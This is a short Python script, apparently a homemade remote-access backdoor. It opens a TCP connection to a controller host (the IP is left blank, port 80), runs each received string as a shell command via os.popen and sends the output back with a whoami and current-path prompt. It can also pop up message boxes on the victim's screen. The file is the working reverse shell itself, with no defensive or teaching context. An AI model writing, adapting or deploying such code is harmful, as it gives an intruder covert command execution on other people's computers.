"""
Made, with fear, by ussaohelcim.
"""
import socket
import os
from tkinter import Tk, messagebox as mb

def PrintHeader():
	username = GetShellResponse("whoami")
	r = "===== ["+ username.decode("utf-8")[:len(username)-1] +"] "
	r += GetPath().decode("utf-8")+">"
	SendToMaster(r.encode())

def SendToMaster(resp: bytes):
	s.send(resp)

def GetFromMaster():
	return ""

def MainLoop():
	while True:
		shell = s.recv(1024).decode("utf-8")
		
		if shell.startswith("#@"):
			t = RemoveFirstChar(shell)
			ShowMessageBox(RemoveFirstChar(t))
		elif shell.startswith("#h"):
			SendToMaster(GetHelp().encode())
		else:
			SendToMaster(GetShellResponse(shell))
			PrintHeader()


def ShowMessageBox(msg):
	root = Tk()
	root.withdraw()
	mb.showinfo("Title",msg)
	root.destroy()

def RemoveFirstChar(txt):
	return txt[1:]

def ShowPath():
	SendToMaster(GetShellResponse("cd"))

def GetPath():
	return GetShellResponse("cd") 

def GetShellResponse(cmd):
	for command in os.popen(cmd):
		resp = command.encode()
	return resp

def GetHelp():
	h = """

#h - return this message.
#@ text - open a message with the text you entered.
#exit - close the connection
"""
	return h

ip = ""
port = 80

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))

MainLoop()
